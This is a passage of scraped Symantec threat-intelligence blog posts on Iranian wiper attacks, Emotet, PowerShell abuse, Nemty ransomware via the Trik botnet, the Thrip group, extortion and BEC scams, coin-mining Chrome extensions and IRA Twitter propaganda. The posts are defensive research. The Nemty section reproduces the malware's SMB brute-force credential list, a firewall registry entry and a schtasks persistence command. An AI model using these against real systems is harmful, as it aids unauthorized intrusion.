of the 2016 Shamoon attacks, Symantec found evidence that the Iran-linkedGreenbugandTimberwormespionage groups may have provided access to the victims’ networks. The 2018 attackshad a tentative link to the Iranian Elfin group(aka APT33), with one victim in Saudi Arabia having been compromised by the group shortly before Shamoon struck. With this in mind, any organization that finds indicators of compromise (IOCs) related to any Iran-linked espionage group on their network should exercise extreme vigilance. While destructive attacks remain a relative rarity, a prior intrusion does appear to be a necessary precursor. Aside from the aforementioned groups, other Iran-linked groups that are highly active at present includeChafer, Crambus (aka OilRig), andSeedworm. Given the recent history of attacks, it is evident that Iranian-sponsored groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not yet shown an appetite for conducting similar attacks against organizations further afield. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability): While Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute. Organizations associated with the U.S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U.S. should not be ruled out, particularly considering the heightened state of tensions at present. However, organizations based in the Middle East likely remain most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization’s network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate.

    "link": "https://www.security.com/threat-intelligence/increase-emotet-spam-observed-blocked-symantec",
    "content": "At the end of 2018, it appeared that the Emotet group had gone dark when its malware campaigns greatly reduced in size. There was another major decline in the summer months of 2019; however, in September 2019, there was an increase in activity (over 100 percent) with Emotet’s (Trojan.Emotet) command and control (C&C) servers delivering a new wave of malicious binaries. As the months went on, we noticed that the volume of malware sent from the C&C servers was increasing. At times, over 1 million hits per day were being blocked by Symantec’s various protection services. Customers using Symantec Messaging Gateway (SMG) or the Email Security.cloud service have even greater protection as these malicious emails are blocked before reaching the end user. Our telemetry showed a blocking volume increase with these technologies. However, because these technologies were able to stop the attacks successfully at an earlier stage in the attack chain, it caused a reduction in the need to use endpoint protection for blocking. Products like Symantec SMG and Email Security.cloud provide a way to block malware at the cloud level before it reaches your network. Emotetstarted out as a banking Trojanfocused on stealing user information by sniffing networks. Over the years, Emotet has evolved by constantly updating its codebase and sophisticated evasion techniques. The Emotet criminals are known to run their botnet as a Malware-as-a-Service (MaaS), enabling other threat actors to easily distribute various malicious payloads such as AZORult (Infostealer.Rultazo), IcedID (Trojan.IcedID), TrickBot (Trojan.Trickybot) etc. The types of emails being used in these attacks come in various forms. The first is an email with a link to an Office document file that contains a malicious macro, which then downloads the malicious executable payload (Figure 2). The Email .Cloud product contains the Link Following service that follows any links it finds in emails to determine if they are spam or malware, which is just one of the benefits of using Email Security.cloud. The second type of email we observed is one with the Office document attached to the email (Figure 3). Document SHA256: 4e35e66d898a56184f42674c5bc41d4abe219beabeafb4cbdddf8ae974326839 Emotet uses social engineering techniques in its spam campaigns, tricking users into opening the file and running the macro to infect victims’ computers. As seen in Figure 4, the document uses a fake warning message asking users to “Enable Editing” in an attempt to trick the user into executing the malicious macro script. The document summary information shows the document was created just a few hours prior to the attack. When the document is opened a malicious macro downloads Emotet’s main module. The macro, which is highly obfuscated in an attempt to bypass traditional antivirus signatures, uses Windows Management Instrumentation (WMI ) classes, such as winmgmts:Win32_Process, to call powershell.exe. Emotet is known to hide its payloads in a document’s objects and streams and this variant is no different. Figure 7 shows a Base64-encoded malicious payload hidden in document streams. The macro uses an obfuscated PowerShell command to download the Emotet binaries. By using legitimateliving-off-the-landbinaries (LoLBins), such as windows PowerShell and WMI, the macro can evade detection by security software. The Emotet module downloads additional payloads to the user’s computer. In Figure 11, we can see that the Emotet module has downloaded the file scanscan.exe to the %AppData% folder. This is the final TrickBot payload, which will conduct further destructive activities. Emotet will create a persistent entry in the registry to make sure that TrickBot runs every time the user logs on.

We have seen multiple similar variants successfully blocked by our heuristics engine scanner over the past few months. We have blocked a high volume of malicious emails with various social engineering subject lines targeting various financial institutions. Some of the subject lines contained the following keywords: These runs were successfully blocked with heuristics that were created as far back as 2016 for our Email Security.cloud security scanner. The advanced scanner is methodical in detecting obfuscation techniques used to hide malicious payloads. Email Security.cloud customers are protected from malware campaigns such as the one discussed in this blog. Symantec proactively protects against Emotet spam with its email security suite of products: File-based protection: Symantec's Security Response organization develops and deploys new security content to Symantec customers.

    "content": "“Living-off-the-land” tactics—where attackers take advantage of native tools and services already present on targeted systems—have been used by both targeted attack groups and common cyber criminal gangs for some time now. Symantec has previously published research that gives a general overview ofliving-off-the-land tactics and fileless attack techniques; however, ournew researchprovides updated statistics on the dual-use tools utilized in these attacks—with a focus on PowerShell and Windows Management Instrumentation (WMI)—and how they are currently being used by different attack groups. The most frequently executed tools observed by Symantec in Q1 2019 were net.exe, PowerShell, the certification utility, the task scheduler, and the WMI command line (WMIC). However, only a fraction of the overall usage of these tools was malicious. The context and execution sequence must be considered when determining if usage is malicious or benign. To do this, we extract execution patterns from our data with the help of advanced machine learning, and the data is then analyzed by our AI-based Targeted Attack Analytics (TAA) component. We also looked at more than 500,000 dual-use tool detections from the beginning of September 2019, which were either used to download or copy payloads to target computers. This revealed that WMI, the command line tool, and PowerShell were most frequently used for malicious purposes, accounting for 89 percent of all dual-use tools used as downloaders. In September 2019 alone, Symantec blocked more than 480,000 malicious PowerShell scripts on endpoints. This number, while significant and steadily increasing, still only represents 0.8 percent of all observed PowerShell usage. Symantec data from between September 2018 and September 2019 shows a 406 percent increase in the number of blocked PowerShell scripts, and this number is likely to increase even further. We also analyzed 100,000 PowerShell command line arguments, keywords used, and frequency of occurrence of parent processes, to discover which were the most frequently used during attacks. Full details of this can be seen inthe white paper. Interestingly, 48 percent of all malicious PowerShell commands were started through WMI. The tool is commonly used to spread PowerShell scripts laterally in internal networks. A typical process for executing a command on a remote system using WMI involves the remote system spawning an instance of wmiprvse.exe and then running the command which, as mentioned, is often a PowerShell command. This means that wmiprvse.exe is present in most process parent chains for malicious PowerShell scripts. Targeted attack groups have been using living-off-the-land tactics for a long time, with almost all active groups having been spotted using dual-use tools at some point. Using these methods allows the attackers to hide their activity among legitimate administration work, and makes attribution difficult as there are no binaries to be analyzed and fewer indicators of compromise (IoC). Looking at six active targeted attack groups and the living-off-the-land tools they use reveals that PowerShell is by far the most popular, with all six utilizing it in their attacks. In all, around 77 percent of targeted attack incidents made use of PowerShell. The credential-dumping tool Mimikatz, used by four of the groups, is the second most popular tool.

    "title": "nemty ransomware trik botnet",
    "link": "https://www.security.com/threat-intelligence/nemty-ransomware-trik-botnet",
    "content": "The Nemty ransomware (Ransom.Nemty), initially detected in August 2019, has increased its reach by partnering up with the Trik botnet (Trojan.Wortrik), which now delivers Nemty to compromised computers. Trik, also known as Phorpiex, has been around for approximately 10 years. In its early days, the malware self-propagated via removable USB drives, Windows Live Messenger, or Skype private messages. The criminals behind the botnet use the infected computers to send email spam and have been observed pushing out a wide range of malware families, with Nemty being the latest to join the list. Nemty, meanwhile, first appeared on the scene in mid-August 2019. While the malware first appeared to be a run-of-the-mill ransomware, a constant series of changes to the threat made it apparent that it was very mucha work in progressand something to be taken seriously. In the past, Nemty has been observed being spread via the RIG exploit kit, as well as via malicious spam campaigns targeting users in Korea and China, where the malware is attached inside an archive. Our data shows that most Nemty infections are found in Korea and China. In early October, we noticed that Trik had begun distributing Nemty as a payload, adding another channel for the ransomware’s delivery. We observed a recent version of Trik delivering a tiny component that uses the Server Message Block (SMB) protocol and a list of hardcoded credentials to try to connect to remote computers with port 139 open. First, the SMB component creates the following registry entry: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\\"[PATH OF THE ORIGINAL FILE]\" = \"[PATH OF THE ORIGINAL FILE]:*:Enabled: Windows NetBIOS Driver\" Trik then checks if the filewinsvcs.txtis present or not in the%AppData%directory on the compromised computer. This file is present if the computer has previously been infected with Trik. To find targets, the SMB componentgenerates random IP addresses then tries to connect to them on port 139. From analysing the malware’s code, we can see that it skips the routine if the created IP address is a local one (Figure 4). The malware can infect public IP addresses with port 139 open that are using any of the common administrator usernames and passwords on its list. Usernames:Administrator, administrator, Admin, admin Passwords:123, 1234, 12345, 123456, 1234567, 12345678, 123456789, 1234567890, 123123, 12321, 123321, 123abc, 123qwe, 123asd, 1234abcd, 1234qwer, 1q2w3e, a1b2c3, administrator, Administrator, admin, Admin, admin123, Admin123, admin12345, Admin12345, administrator123, Ad ministrator123, nimda, qwewq, qweewq, qwerty, qweasd, asdsa, asddsa, asdzxc, asdfgh, qweasdzxc, q1w2e3, qazwsx, qazwsxedc, zxcxz, zxccxz, zxcvb, zxcvbn, passwd, password, Password, login, Login, pass, mypass, mypassword, adminadmin, root, rootroot, test, testtest, temp, temptemp, foofoo, foobar, default, password1, password12, password123, admin1, admin12, admin123, pass1, pass12, pass123, root123, abc123, abcde, abcabc, qwe123, test123, temp123, sample, example, internet, Internet If access is granted, the malware uses the SMB protocol to copy itself to the remote machine. It then uses the Windows Service Control Manager to start the SMB component’s process on the remote machine. The sample running on the remote machine also checks for the presence of winsvcs.txt, which again determines whether or not Nemty is downloaded and executed. Other researchers have provided a detailed analysis of Nemty 1.0. However, during our analysis of Nemty 1.6, we noted some key updates compared to 1.0, which are listed here: cmd.exe /c schtasks.exe /create /sc onstart /tn “NEMTY_<FILEID>_” /tr “C:\\Users\\user\\AdobeUpdate.exe” The developers behind the Nemty ransomware are constantly updating and improving its code, as well as its delivery methods, in an attempt to reach more victims. The Trik botnet, itself known foradapting to the latest trendsin order to stay relevant, makes a perfect partner in crime for Nemty.

    "title": "thrip apt south east asia",
    "link": "https://www.security.com/threat-intelligence/thrip-apt-south-east-asia",
    "content": "Since Symantecfirst exposed the Thrip group in 2018, the stealthy China-based espionage group has continued to mount attacks in South East Asia, hitting military organizations, satellite communications operators, and a diverse range of other targets in the region. Many of its recent attacks have involved a previously unseen backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Analysis of the latter has revealed close links to another long-established espionage group called Billbug (aka Lotus Blossom). In all likelihood, Thrip and Billbug now appear to be one and the same. Since we last published on Thrip in June 2018, the group has attacked at least 12 organizations, all located within South East Asia. Its targets have been located in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. The group has attacked a diverse range of targets over the past year, most notably military targets in two different countries. It has also attacked organizations in the maritime communications, media, and education sectors. Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. One of the most alarming discoveries we made in our original Thrip research was that the group had targeted a satellite communications operator and seemed to be interested in the operational side of the company, looking for and infecting computers running software that monitored and controlled satellites. Significantly, Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. Much of this recent activity was uncovered by Symantec following the discovery of a Thrip tool, a backdoor called Hannotog which appears to have been used since at least January 2017. It was first detected in an organization in Malaysia, where it triggered an alert for suspicious WMI activity with ourTargeted Attack Analytics (TAA)technology, available in Symantec Endpoint Detection and Response (EDR). TAA leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. TAA allowed us to uncover Hannotog and from there, our expert threat hunting team built out a profile of the adversary’s tools, tactics, and procedures. This allowed us to identify other organizations that have been compromised by Thrip, allowing us to build up a complete picture of the group’s most recent activities. Hannotog is a custom backdoor which provides the attackers with a persistent presence on the victim’s network. It has been used in conjunction with several other Thrip tools, including Sagerunex, another custom backdoor providing remote access to the attackers, and Catchamas (Infostealer.Catchamas), a custom Trojan deployed on selected computers of interest and designed to steal information. In addition to custom malware, Thrip has made extensive use of dual-use tools and living-off-the-land tactics. These include: Since Symantec first uncovered Thrip in 2018, we’ve found strong evidence linking it to the Billbug group. What ties the two groups together is the Sagerunex backdoor. This malware appears to be an evolution of an older Billbug tool known as Evora. By comparing strings and code flow between the two, we found that: Billbug is a long-established espionage group, active since at least January 2009. Similar to the Thrip sub-group, the wider Billbug group is known for specializing in operations against targets in South Asia. Billbug’s targets are usually compromised by either spear-phishing emails or watering hole attacks. The group’s spear-phishing attacks have tended to use exploits in Microsoft Office and PDF documents to drop its malware onto victims’ computers. To date, many of the group’s targets have been governments or military organizations. Thrip appears to have been undeterred by its exposure last year, continuing to mount espionage attacks against a wide range of targets in South East Asia. Its link to the Billbug group puts its activities into context and proves its attacks are part of a broader range of espionage activity heavily focused on (but not limited to) governments, armed forces, and communications providers. Symantec’s TAA was the catalyst for both our initial discovery of Thrip in 2018 and the discovery of new tools and victims in 2019. Without TAA’s artificial intelligence, it is quite likely that the group’s activities may have gone undetected for a lot longer. Symantec Endpoint Detection and Response (SEDR),which contains TAA technology, automatically detects Thrip-related activity. In addition to SEDR,Symantec’s Managed Endpoint Detection and Response (MEDR) serviceleverages automated attack hunting provided by analytics as well as Symantec analyst security expertise to remotely investigate and contain incursions by adversaries such as Thrip in Symantec customer networks. The following protections are also in place to protect customers against Thrip attacks: File-based protection Customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Thrip and Billbug, which detail methods of detecting and thwarting activities of this group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "content": "An email arrives in your inbox, with one of your old passwords in the Subject line. Your curiosity is piqued, and you click into the message, only to discover that someone has allegedly hacked your webcam and recorded you engaged in some intimate acts, and they are now threatening to send this recording to everyone in your contact list. However, if you send the anonymous blackmailer a few hundred dollars in bitcoins they promise that no one will see the embarrassing footage. This is a situation many people found themselves in over the last year, as we witnessed a revival and evolution in email extortion scams, which are exactly what they sound like: scam emails that attempt to extort cash from victims. These sorts of scams have been around for many years, but the scenario outlined above—often referred to as a \"sextortion\" scam—is one of the main types of extortion scams we have started seeing more frequently again since about mid-2018. When we look at the number of these kinds of scams that have been blocked by Symantec since the start of this year, we can see the trend is going upwards, with a spike visible during a two-week period in February especially notable. Between January 1 and May 29, 2019, just under 289 million of these types of emails were blocked by Symantec technologies. Just over 85 million of these emails (almost 30 percent) were blocked during this 17-day period in February when we saw a big spike in these types of scams. We didn’t just see a surge in one particular type of scam in this period, but a surge in a few different variations of extortion scam emails, including: Most of these sextortion-style scams follow largely the same pattern, with variations in the messages such as using attachments or obfuscated characters, etc., applied in an attempt by attackers to evade email protection technologies. For example, some spam filters might work by blocking emails with Bitcoin addresses in the body—hence why attackers may have then turned to using PDF attachments or obfuscated text to try to bypass the spam filter. Most of these emails also contain a password or partial phone number previously (or perhaps still) associated with the email address the email is sent to. This is included to make it appear the attacker has access to private information about the recipient—when in fact they almost certainly obtained it from one of the many large password dumps of recent years. In most of these scam emails, the attacker claims to have a recording of you visiting a porn website, though in some cases the attacker pretends to be a member of law enforcement who has found child pornography on your device. The big exception to this is the bomb scare emails, where the sender claims to have planted a bomb in your building that will be triggered if the requested amount of money is not paid. Some of the typical characteristics and features we have seen in these spam emails are outlined in the table below. When it comes to the success of these scams, if we examine the 5,000 most-seen Bitcoin addresses in May, we can see that 63 of those wallets received bitcoins in 243 transactions. In total, the wallets received 12.8 bitcoins in that period—at the end of May one bitcoin was worth approximately US$8,300, meaning these wallets received a total of approximately US$106,240. If we take that as an average amount to make in a 30-day period for these kinds of scams, it means they are making just over US$1.2 million in a year ($1,292,586). For the amount of effort and skill that is required to carry out these scams, it represents a pretty good return on investment. Almost all these wallets had been cleared out when we examined them at the end of May—it appears the criminals involved are not leaving any funds in these wallets for too long. These scams don’t appear to be targeted—they are sent out as part of automated mass-mailing campaigns, seemingly using email and password combinations found in the many data dumps of recent years. The Necurs botnet was evenreportedly being used to send these scamsat one point. Some of these scams were reportedly also being used to spread the now-apparently-retired GandCrab ransomware, giving cyber criminals two chances to scam victims out of money. As these email extortion scams are typical cyber crime activity, it is not clear exactly who is behind these attacks, but Symantec believes that a minimum of two cyber crime groups are engaged in this kind of activity, though there are potentially also many others. The barriers to entry for criminals are quite low for these scams—they do not necessarily require a huge degree of technical knowledge, and criminals only need a small percentage of them to be successful to make a profit. These scams are still being actively sent, so consumers should be aware of these scams and the steps they can take to avoid falling victim to them.

    "link": "https://www.security.com/threat-intelligence/bec-scams-trends-and-themes-2019",
    "content": "Business email compromise (BEC) scams are not going away anytime soon. For such a relatively low-tech type of financial fraud, it has proved to be a high-yield and lucrative enterprise for scammers. BEC scams—also known as email account compromise (EAC), CEO fraud, or whaling—have been around since at least 2013. Between October 2013 and May 2018, more than $12 billion in domestic and international losses were attributed by the FBI to BEC scams. According to the FBI's latestInternet Crime Report (ICR), losses from BEC scams amounted to almost $1.3 billion in 2018. This is double the losses in 2017, which stood at $676 million. In 2018, the FBI's Internet Crime Complaint Center (IC3) also received 20,373 BEC-related complaints, which is up from 15,690 complaints in 2017. Aggregate losses from internet-enabled theft, fraud, and exploitation reached $2.7 billion in 2018, and losses from BEC scams accounted for almost one-half of this figure. The FBI alsosaid in a July 2018 public service announcement that, based on the financial data, banks located in China and Hong Kong were the primary destinations of fraudulent funds, while financial institutions in the UK, Mexico, and Turkey were also prominent destinations. The good news is that the IC3's Recovery Asset Team (RAT), which was formed in February 2018, has successfully recovered more than $192 million lost to BEC scams, representing a recovery rate of 75 percent. The RAT reportedly dealt with 1,061 incidents that caused losses of more than $257 million. Given this dramatic rise in actual BEC-related losses as well as complaints, we wanted to examine BEC scams more closely. Is the number of BEC emails sent daily growing? How many businesses are targeted by BEC scams each month? Which regions are most targeted by these scams? According to Symantec telemetry, the average daily volume of BEC emails was significantly higher in the first quarter of this year than in the same period last year. From January to March 2018, the average daily BEC email volume was 85,816, while from January to March 2019, the average daily volume was 128,700—a 50 percent increase. We found that an average of 6,029 organizations were targeted by BEC emails per month during the last 12 months, from July 2018 through June 2019. BEC scams could have potentially affected this many businesses monthly were these attacks not blocked. This indicates that BEC scammers have slightly reduced their targets, as an average of 6,089 businesses were targeted per month in the previous 12 months. We also found that businesses received an average of five BEC scam emails each month during the past 12 months. This means each business had a 17 percent chance of getting at least one BEC email per month. In the previous 12 months, an organization would have received an average of four BEC emails per month. In which regions are these targeted businesses located? The top 10 regions targeted by BEC scammers in the last 12 months are led by the U.S. (39 percent), followed by the UK (26 percent), Australia (11 percent), Belgium (3 percent), Germany (3 percent), Canada (2 percent), the Netherlands (2 percent), Hong Kong (2 percent), Singapore (2 percent), and Japan (1 percent). One interesting metric we looked at was the most popular Subject lines used in BEC emails in the last 12 months and in which victim regions these were used. BEC scams targeted at the UK and the U.S. were mostly labeled \"Important,\" while most BEC scams that hit Australia, Spain, France, and Germany had payment-related themes. We also looked at the 10 most popular keywords used in BEC emails in the last 12 months. \"Transaction request\" topped the list with 39,368 instances observed, followed by \"Important\" (37,477) and \"Urgent\" (33,391). There were three iterations of \"Payment\" that rounded up the top 10, including \"Outstanding payment\" and \"Notification of payment received.\" Almost all of the keywords are meant to call the attention of the recipient or induce a sense of urgency with finance-related themes. Email scammers have been known to use so-called cousin domains—for example \"sym@ntec.com\" instead of \"symantec.com\". BEC scammers appear to have gone easy on these cousin domains in the last 12 months, and have gone back to using free web accounts and web mailers, such as gmail.com, yahoo.com, aol.com, and inbox.lv. Using and/or spoofing such legitimate domains also lends legitimacy to the scam. Four popular email services—including Gmail, AOL, Yahoo! Mail, and Hotmail—are among the 10 top most abused domains from which BEC emails are sent, with Gmail and AOL bearing the brunt. What's most surprising here is that AOL, which experienced a sharp decline in subscribers back in 2007, apparently remains a top choice for BEC scammers. Let's take a closer look at the BEC emails themselves. We have noted recent changes in BEC message composition, with scammers building on previous ideas, getting more creative, and using newer themes, such as: This observation aligns with that of the FBI's, as the IC3 report found that in 2018, there was an increase in the number of BEC complaints requesting victims purchase gift cards. According to the report, the victims received a spoofed email, call, or text from a person in authority requesting that the victim purchase multiple gift cards for either personal or business reasons. Specifically, Symantec's Security Response team observed that the 10 most popular themes carried by BEC emails in the last 12 months include: BEC scams are said to have begun with the hacking or spoofing of CEOs' or CFOs' email accounts, with scammers sending fraudulent emails typically to a company’s finance department an' tricking employees into making wire transfer payments. A combination of email spoofing, computer intrusion, and social engineering is required to pull off this type of scam. These scams have been constantly evolving, with scammers getting craftier and growing more sophisticated each year. This year alone, we have seenFacebook and Google getting defrauded of $100 million; Chinese fraudstersstealing $18.6 million from the Indian arm of an Italian engineering company; and BEC gangsexpanding geographic targetsandidentifying new victims, such as universities, the Salvation Army, and Boy Scouts of America. Even a small church in Ohiowas not spared. What lies ahead for BEC scams? As artificial intelligence (AI) and machine learning (ML) become more developed, we may very well see BEC scammers adopting these technologies in the near future to make their attacks even more convincing. Both ML and AI could be used to power audiovisual \"deepfakes\" that target or impersonate C-Suite executives. Already we have seen deepfakes that use only audio, as it is easier to leverage than both audio and visual elements. A BEC scammer using ML/AI could target an organization's senior financial executive or employee who has direct access to the CEO and who could authorize money transfers. When the employee tries to verify the request, the scammer might use audio featuring the CEO—such as earning calls, YouTube footage, TED talks, and other previous recordings—to fool the employee into believing it is indeed the CEO's voice on the other end ordering the transfer. The employee could then execute the request fully believing it was legitimate. While this is a scary prospect, future BEC scam scenarios may just play out this way.

    "title": "cryptojacking extensions chrome web store",
    "link": "https://www.security.com/threat-intelligence/cryptojacking-extensions-chrome-web-store",
    "content": "On May 8, we discovered two extensions for Google’s Chrome web browser that secretly perform coin mining after they are installed. Both extensions were found on the official Google Chrome Web Store. One of the extensions, called2048, is a version of apopular math-based strategy game. The extension was published in August 2017 and has over 2,100 users, which suggests the publisher has made some profit using the CPU cycles of those users to mine for cryptocurrency. The other extension, Mp3 Songs Download, claims to be an MP3 downloader but just redirects the user to an MP3 download website when they click on the extension button. The MP3 download website secretly launches a coin-mining script in the background. The Mp3 Songs Download extension was published in June 2017 and has around 4,000 users. Coin-mining script:2048 The source code for the2048extension contains a hardcoded domain that is triggered when Chrome is launched. The form in http://www.madafak[DOT]in/landing sends a POST request with a hidden field to www.madafak[DOT]in after one second. The main page www.madafak[DOT]in attempts to pass itself off as Google Analytics but it secretly loads a coinminer library (ga.js) in the background. From the script shown in Figure 7 we can see that the coinminer mines Monero, throttles CPU usage at 0.5 (50 percent), and contains a hardcoded Monero wallet address (5bdd3443937ebe08d3e3c99e9524afc13702eba28340). Coin-mining script:Mp3 Songs Download The extension Mp3 Songs Download doesn’t start its coin-mining script until the user clicks on the extension button and is redirected to a website. As the JavaScript in Figure 8 shows, the extension redirects the user to http://mp3song-s[DOT]com. This website looks just like a normal MP3 download site (Figure 9) and actually functions as one. However, it also loads coin-mining JavaScript (VEZ4.js) secretly, which can be seen in the website’s source code (Figure 10). From the source code we can also see the hardcoded wallet key and throttling ratio, which is set at 0, meaning 100 percent of the user’s CPU cycles can be used for mining. The coin mining will persist for as long as the browser (with the2048extension installed) or website (in the case of theMp3 Songs Downloadextension) remains open. The effects of this activity could include device slowdown, overheating batteries, increased energy consumption, and even devices becoming unusable. Figure 11 shows our test computer’s CPU usage spiking at 100 percent after theMp3 Songs Downloadextension was installed. Furthermore, the malicious activity of these extensions is made harder to detect by the fact that they function as described. For example, the game 2048 is playable just like any 2048 game and the MP3 website contains downloadable MP3 files. This means that many users will not be suspicious and may not realize their computing power is being hijacked to make money for the developers behind these extensions. We notified Google about these coin-mining extensions and they have now been removed from the Google Chrome Web Store. Symantec and Norton products detect the extensions as the following: Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security.

    "content": "One of the main talking points of the 2016 U.S. presidential election campaign involved attempts to surreptitiously influence public opinion using social media campaigns. In the months after the election, it quickly became apparent that a sophisticated propaganda operation had been directed against American voters. Not surprisingly, news of these campaigns caused widespread public concern, prompting social media firms to launch investigations into whether their services had been misused. In October 2018, Twitterreleased a massive datasetof content posted on its service by the Internet Research Agency (IRA), a Russian company responsible for the largest propaganda campaign directed against the U.S. The datasetconsisted of 3,836 Twitter accounts and nearly 10 million tweets. These accounts had amassed almost 6.4 million followers and were following 3.2 million accounts. The sheer volume of data was enormous, more than 275 GB. The archive has proven to be a treasure trove of information on how the IRA’s propaganda campaign operated.  For example, prior to the release, many people assumed that its posts were focused on just one side of the political spectrum. Once the data was made public, it quickly became obvious that in order to achieve its goal, the campaign directed propaganda at both sides of the liberal/conservative political divide in the U.S., in particular the more disaffected elements of both camps. The main objective of the campaign instead appeared to be sowing discord by attempting to inflame opinions on both sides. This was not just confined to the online sphere. Several of the accounts were used to organize political rallies in the U.S. and some of the most influential accounts in the dataset were used to promote these events to the largest possible audience. However, believing that there is a lot to learn from this data beyond its messages and target audience, we decided to carry out some in-depth analysis of the archive to learn more about how this propaganda campaign worked. What we discovered was that this was not an ad-hoc response to political events in the U.S. Instead, the evidence points to a carefully planned and coordinated operation, with the groundwork often laid months in advance. While the tactics employed changed somewhat over time, the basic template for this operation remained the same, utilizing a small core of accounts to push out new content and a wider pool of automated accounts to amplify those messages. Along the way, we also came across some interesting bits of information, such as what appeared to be some rogue operators using monetized link-shortening services to make some money on the side. Once we started analyzing the data, it became apparent that the accounts could be divided into two main categories, which we called main accounts and auxiliary accounts. Each category had different characteristics and played a different role. Main accounts had at least 10,000 followers but followed substantially fewer accounts. They were primarily used to publish new tweets. Auxiliary accounts had less than 10,000 followers, but often followed more accounts than that. Their main purpose was to retweet messages from other accounts, although they were also used to publish original tweets. Not surprisingly, the majority of accounts were auxiliary accounts. We identified 123 main accounts and 3,713 auxiliary accounts within the dataset. Main accounts generally were ”fake news” outlets masquerading as regional news outlets, or pretending to be political parties or hashtag games—the popular Twitter game that involves people sharing anecdotes or jokes based on a single theme, such as #5WordsToRuinADate. Based on their creation date they were usually created individually or in small batches. The default language selected for main accounts was always either English or Russian. Auxiliary accounts usually pretended to be individuals, spreading the content created by the main accounts by retweeting it. These accounts were usually created in batches and sometimes hundreds of auxiliary accounts were created on the same day. For example, during May 2014, seven fake news accounts were set up by the agency, along with 514 auxiliary accounts. Many of the accounts were created long before they were used. The average time between account creation and first tweet was 177 days. The average length of time an account remained active was 429 days. Some of the Twitter accounts created by the attackers managed to be extraordinarily influential. The most retweeted account within the dataset was TEN_GOP. Created in November 2015, the account masqueraded as a group of Republicans in Tennessee. It appears to have been manually operated. In less than two years TEN_GOP managed to rack up nearly 150,000 followers. Despite only tweeting 10,794 times, the account garnered over 6 million retweets. Only a tiny fraction (1,850) of those retweets came from other accounts within the dataset. In other words, almost all of its retweets came from accounts outside the dataset, meaning many could have been real Twitter users. Due to the popularity of this account, the IRA created two backup accounts in case TEN_GOP should be discovered and shutdown—ELEVEN_GOP and realTEN_GOP—both of which have the same profile description: “This is our backup account in case anything happens to @TEN_GOP”. As has already been noted, the IRA’s campaign targeted both ends of the political spectrum in the U.S. and this is reflected in the breakdown of influential accounts. The top 20 most retweeted English-language accounts were split evenly between conservative and liberal messages. There is a similar split in themes in the breakdown of the most followed English language accounts. Thirty-five percent pretended to support conservative causes, while 30 percent pretended to back liberal causes. The remainder masqueraded as general or political news outlets. Most of the fake news accounts created by the agency pretended to be local news outlets, such as “New Orleans Online”, “El Paso Top News”, or “San Jose Daily”. The majority of these accounts were created between May and August of 2014, but lay dormant until January 2015, when most of them started tweeting. This suggests that the fake news element of the operation was planned well in advance. The vast majority (96 percent) of these fake news accounts were fully automated, using services to monitor blog activity and automatically push new blog posts to Twitter. Another two percent of these accounts queued tweets for publication at scheduled times. Most followed a broad pattern of activity, with activity trending upwards from the beginning of 2015 until the summer of 2016 when there was a sudden fall in activity. By August 2016, all but one fake news account had stopped tweeting. This is likely because the fake news accounts had been using a service known as Twitterfeed to feed their blogs to Twitter. During 2016, Twitterfeed announced that it would close by October of that year and the fake news accounts began to transition to an alternative service called Twibble. The drop off in activity during August 2016 could have been caused by technical problems during the changeover. By December the changeover was complete and the fake news accounts had resumed business as usual. Not surprisingly, a majority (55 percent) of the most prolific accounts were fake news accounts. However, a significant number of prolific accounts had their identities masked by Twitter because they had less than 5,000 followers. Most of these accounts acted as auxiliary accounts and were automated in the same manner as most of the fake news accounts. However, while fake news accounts were automated to publish original content, these other accounts were automated to retweet content. Some tweets within the dataset contained links to other content. The majority of links were shortened URLs, masking the final destination. To get a picture of which sites these tweets were linking to, we followed each shortened URL tweeted during 2016 to find out the ultimate link destination. The largest number of links led to other Twitter posts, some of which were to other suspended accounts. Aside from Twitter, other social media services such as YouTube, Instagram, and Facebook also figured highly in the list of websites being linked to. The rest of the list was mostly filled out by links to legitimate media outlets. This suggests that, along with delivering “fake news” the campaign also leveraged real news stories that supported messages it was pushing. During the months prior to the 2016 U.S. presidential election, there was a marked increase in activity. Between January and November 2016, accounts within the dataset sent 771,954 English language tweets, with a marked uptick in activity as November approached. Analysis of the topics tweeted by English language accounts during this time period reveals that content was heavily focused on the election and quite evenly split between topics relating to either side of the political spectrum in the U.S. Perhaps the most overt aspect of the propaganda campaign was the IRA’s organization of a number of political rallies in the U.S. Despite the fact that the accounts comprised of fake personas and organizations, they nevertheless succeeded in mobilizing people to attend events. Besides its online activities, the campaign’s operators also organized rallies supporting positions on both sides of the political spectrum. One account, @March_for_Trump, advertised more events than any other account in the dataset, promoting events 47 times. Most of the other accounts involved in promoting rallies are anonymized as they have less than 5,000 followers. Only nine accounts in the dataset retweeted March_for_Trump’s tweets promoting rallies, but the majority of these retweets came from the most followed or retweeted accounts in the dataset, suggesting the campaign’s operators had prioritized promoting these events. While this propaganda campaign has often been referred to as the work of trolls, the release of the dataset makes it obvious that it was far more than that. It was planned months in advance and the operators had the resources to create and manage a vast disinformation network. It was a highly professional campaign. Aside from the sheer volume of tweets generated over a period of years, its orchestrators developed a streamlined operation that automated the publication of new content and leveraged a network of auxiliary 